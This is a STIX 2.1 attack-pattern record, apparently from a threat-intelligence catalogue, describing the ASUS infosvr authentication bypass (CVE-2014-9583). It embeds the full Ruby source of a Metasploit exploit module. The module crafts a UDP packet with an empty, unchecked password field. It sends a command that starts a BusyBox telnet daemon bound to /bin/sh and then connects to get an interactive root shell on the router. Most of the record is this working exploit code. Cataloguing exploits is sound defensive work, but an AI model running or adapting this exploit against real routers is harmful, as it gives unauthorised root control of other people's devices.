{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--85a646f4-d7a3-4bab-b659-ad0bb25b67ce",
    "created": "2024-08-14T16:57:14.152679Z",
    "modified": "2024-08-14T16:57:14.152683Z",
    "name": "ASUS infosvr Auth Bypass Command Execution",
    "description": " This module exploits an authentication bypass vulnerability in the infosvr service running on UDP port 9999 on various ASUS routers to execute arbitrary commands as root.  This module launches the BusyBox Telnet daemon on the port specified in the TelnetPort option to gain an interactive remote shell.  This module was tested successfully on an ASUS RT-N12E with firmware version 2.0.0.35.  Numerous ASUS models are reportedly affected, but untested. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/asus_infosvr_auth_bypass_exec.rb",
            "external_id": "asus_infosvr_auth_bypass_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9583"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/jduck/asus-cmd"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'ASUS infosvr Auth Bypass Command Execution',\n      'Description' => %q{\n        This module exploits an authentication bypass vulnerability in the\n        infosvr service running on UDP port 9999 on various ASUS routers to\n        execute arbitrary commands as root.\n\n        This module launches the BusyBox Telnet daemon on the port specified\n        in the TelnetPort option to gain an interactive remote shell.\n\n        This module was tested successfully on an ASUS RT-N12E with firmware\n        version 2.0.0.35.\n\n        Numerous ASUS models are reportedly affected, but untested.\n      },\n      'Author'      =>\n        [\n          'Friedrich Postelstorfer', # Initial public disclosure and Python exploit\n          'jduck', # Independent discovery and C exploit\n          'bcoles' # Metasploit\n        ],\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'unix',\n      'References'  =>\n        [\n          ['CVE', '2014-9583'],\n          ['EDB', '35688'],\n          ['URL', 'https://github.com/jduck/asus-cmd']\n        ],\n      'DisclosureDate' => '2015-01-04',\n      'Privileged'     => true,\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Compat' => {\n            'PayloadType'    => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n      'Targets'        => [['Automatic', {}]],\n      'DefaultTarget'  => 0))\n    register_options [\n      Opt::RPORT(9999),\n      OptInt.new('TelnetPort', [true, 'The port for Telnetd to bind', 4444]),\n      OptInt.new('TelnetTimeout', [true, 'The number of seconds to wait for connection to telnet', 10]),\n      OptInt.new('TelnetBannerTimeout', [true, 'The number of seconds to wait for the telnet banner', 25])\n    ]\n    register_advanced_options [\n      # If the session is killed (CTRL+C) rather than exiting cleanly,\n      # the telnet port remains open, but is unresponsive, and prevents\n      # re-exploitation until the device is rebooted.\n      OptString.new('CommandShellCleanupCommand', [true, 'A command to run before the session is closed', 'exit'])\n    ]\n  end\n\n  def telnet_timeout\n    (datastore['TelnetTimeout'] || 10)\n  end\n\n  def telnet_port\n    datastore['TelnetPort']\n  end\n\n  def request(cmd)\n    pkt = ''\n    # ServiceID   [byte]      ; NET_SERVICE_ID_IBOX_INFO\n    pkt << \"\\x0C\"\n    # PacketType  [byte]      ; NET_PACKET_TYPE_CMD\n    pkt << \"\\x15\"\n    # OpCode      [word]      ; NET_CMD_ID_MANU_CMD\n    pkt << \"\\x33\\x00\"\n    # Info        [dword]     ; Comment: \"Or Transaction ID\"\n    pkt << Rex::Text.rand_text_alphanumeric(4)\n    # MacAddress  [byte[6]]   ; Double-wrongly \"checked\" with memcpy instead of memcmp\n    pkt << Rex::Text.rand_text_alphanumeric(6)\n    # Password    [byte[32]]  ; Not checked at all\n    pkt << \"\\x00\" * 32\n    # Command Length + \\x00 + Command padded to 512 bytes\n    pkt << ([cmd.length].pack('C') + \"\\x00\" + cmd).ljust((512 - pkt.length), \"\\x00\")\n  end\n\n  def exploit\n    connect_udp\n    print_status \"#{rhost} - Starting telnetd on port #{telnet_port}...\"\n    udp_sock.put request \"telnetd -l /bin/sh -p #{telnet_port}\"\n    disconnect_udp\n\n    vprint_status \"#{rhost} - Waiting for telnet service to start on port #{telnet_port}...\"\n    Rex.sleep 3\n\n    vprint_status \"#{rhost} - Connecting to #{rhost}:#{telnet_port}...\"\n\n    sock = Rex::Socket.create_tcp 'PeerHost' => rhost,\n                                  'PeerPort' => telnet_port,\n                                  'Context'  => { 'Msf' => framework, 'MsfExploit' => self },\n                                  'Timeout'  => telnet_timeout\n\n    if sock.nil?\n      fail_with Failure::Unreachable, \"Telnet service unreachable on port #{telnet_port}\"\n    end\n\n    vprint_status \"#{rhost} - Trying to establish a telnet session...\"\n\n    prompt = negotiate_telnet sock\n    if prompt.nil?\n      sock.close\n      fail_with Failure::Unknown, 'Unable to establish a telnet session'\n    end\n\n    print_good \"#{rhost} - Telnet session successfully established...\"\n\n    handler sock\n  end\n\n  def negotiate_telnet(sock)\n    prompt = '#'\n    Timeout.timeout(datastore['TelnetBannerTimeout']) do\n      while true\n        data = sock.get_once(-1, telnet_timeout)\n        if !data or data.length == 0\n          return nil\n        elsif data.include? prompt\n          return true\n        end\n      end\n    end\n  rescue ::Timeout::Error\n    return nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-01-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}